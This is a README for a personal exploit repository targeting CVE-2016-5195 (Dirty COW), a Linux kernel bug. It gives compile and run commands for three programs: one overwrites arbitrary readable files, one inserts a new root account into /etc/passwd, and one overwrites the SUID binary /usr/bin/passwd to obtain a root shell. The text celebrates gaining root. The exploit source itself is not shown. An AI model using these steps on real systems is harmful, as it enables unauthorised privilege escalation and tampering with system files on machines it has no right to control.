# CVE-2016-5195
my personal POC and EXPLOIT of CVE-2016-5195 (dirty COW)

# Usage

## POC: write files arbitrarily

Just a simply POC of this CVE, compile the file `poc.c` as follow:

```shell
$ gcc poc.c -o poc -static -lpthread
```

You shall run it as follow:

```shell
./poc destination_file fake_file
```

You shall make sure the destination file is at least readable. The content of the destination file will be overwrite by the one of the fake, **if failed, just try more times until it succeed.**

**ONLY the content in the length of the original file will be write**

## EXPLOIT: GET THE ROOT

### I. generate a new ROOT user

Compile the file `root_newuser.c` as follow:

```shell
$ gcc root_newuser.c -o dirty -static -lpthread -lcrypt
```

Then run it as follow:

```shell
$ ./dirty new_username new_password
```

Type your new username and a password, it'll generate a new user WITH ROOT in the file `/etc/passwd`, check the first line of the file to see if it's successful and login with your new username and new password, then **JUST ENJOY THE POWER OF THE ROOT**

### II. overwrite SUID application to provide a ROOT SHELL

Compile the file `root_suid.c` as follow:

```shell
$ gcc root_suid.c -o dirty -static -lpthread
```

Then you can run it simply without any extra arguments. Check if the `/usr/bin/passwd` get changed(`sha256sum` may be useful) and then run it. Then **IT COMES TO THE TIME OF THE ROOT!**

# Analyzation of the CVE-2016-5195

You can visit [my blog](https://arttnba3.cn) for more information about this CVE